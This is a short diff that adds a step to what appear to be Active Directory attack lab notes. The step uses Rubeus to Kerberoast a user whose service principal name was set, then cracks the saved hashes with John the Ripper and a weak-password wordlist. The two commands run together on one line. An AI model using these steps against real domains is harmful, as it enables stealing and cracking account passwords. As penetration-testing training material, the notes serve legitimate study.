@@ -197,3 +197,9 @@ Set-ADUser -Identity support1user -ServicePrincipalNames
 
 
 
+- Kerberoast the user
+
+```powershell
+Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-
+pass.txt C:\AD\Tools\targetedhashes.txt
+```
